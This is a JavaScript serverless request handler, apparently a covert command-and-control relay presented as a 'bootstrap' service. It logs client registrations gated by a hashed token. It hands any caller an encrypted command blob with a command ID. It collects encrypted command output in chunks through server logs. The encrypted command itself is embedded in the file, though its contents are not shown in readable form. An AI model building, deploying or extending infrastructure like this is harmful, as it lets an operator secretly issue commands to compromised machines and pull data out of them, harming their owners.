import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '19';
const CONTROL_PAYLOAD = 'U2FsdGVkX1/R3bA50HxaL8vLrSqXdmYOWavSvIpHkK+fg+njXVmGatL4KM3LAZmlYL7RcM7UTw8H8oJhzaX62eo3oOiSqtkYSzK8zYBYd/iSUUOfR2FmA3B1x8MhlOVsj1WChVRARGQomVuJczVD9UrXsw6O4FbUv7ghj7CnzKiNEsw3Q7ZKkV/gfaXGT2KvtxKCX+xTK7A9J6wriBDB1ltj9A5iCe0rcqr9aF51p7hSNjb2CyGO0N8U5Q9Y/Ih7K/7iniDitkyFDsEn/zXWqT34PgXrl2wkjXAJKDA+/zdmwpUtRVjtLm48PprdhEmWVjK9uvbMdsMOsuUFX/4k7DpQafib3C1szLpozkCn+RhTUOaQ1TxKjG0ku2l2SvNY7m2aJHp7I3/Bn3MJqWn3QHHEtufyt2DOEPaWqJFOsgVx4y0vtgVCHBbLbLanT0DZDOawTqaEpcQOinhC067U/ykvM+TWG6U+cjsTK6PpkrHhTfO2AU9KUc+bJZRJclNvXDam5G0LEXQfPnL4mcDEoB304ymf+9rzKWV0aZXzFxTxnGiE9JtcNsR6C/Lz0wxp5qLuk9IR2EJ4DgA2T+Ic33yuRxvzVKdochv8Pk7HqYKMHYtjt7VcImkOQLQ12cpZ36toZ/CIvqK+hlkMve5+DRcEQ6eoSrpjw0N66JFa7ho/gq55YEURGU1khwwTxiR5lxARGOfq5OtARxmoHRUJEANLc0c/pW+I4I7aHFt5kGwlfs6NLThlUsoKSQmkT9bUdSS6iTuPqf8zTgaPYRZSYgSHX2LW/I2JGoSbh7HW6KVBrXCLhP7gjl1bkGdpBJg5CCLqxtIIlm/eboFdPtsc6QCwNIZ2KGQX3ODCJHEmtdHx/KB2fRpPACkx9DyUR9rHzG3or/Q4tuvwqPfUotI+aEKZCs8t0WvwniEauRNXsrXdsnF8AISjmWvu7Xr5ANNJMt8r+B/B7hXJwocwkQwbcxPkldhklcRcHDXRx88TKNUSJKyZGkc2aZ3LyCZAOBAkc63Qd4S0ONVf9A88JPz1/N0vLDAMd5Wrw9Yf05kMwCT9hUpbkUGyRsewnTPTxIDtTFzjaT9NeV7i8qM4NDk7satWo9s4SQl3L2HjBscguv6xQLbDhcQr3OEEFXgQnULrfMUd9c1mql3IjYsC4Xe8v054IHOxF5aTHypWykuAr1ZsbxsJsW3Z2spt3sDqxnVvNUJ+eYqE5N0SCmtos+Z07f0saI5RtyWUa/H9xd6bo+HUWIMgOi7mtvKNUr4uZA4188rCswyigo3tbVzLvkoDDWf5cQb2NDf2kglxdmC9TIrlU3mC5/Iuwihkq0j/wsCTewWAM9dIDTzFWynQDu/ptI0V6/OWhbrHKJoo8eQnsw0erq3LQhjyomgi5yzjoF/W7Cl7/slP/oE2YFk+x7APvA==';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}

function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    const splitAt = body.indexOf(':');
    const commandId = splitAt >= 0 ? body.slice(0, splitAt) : 'unknown';
    const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
    const chunkSize = 1800;
    const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
    for (let i = 0; i < total; i += 1) {
      console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
    }
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
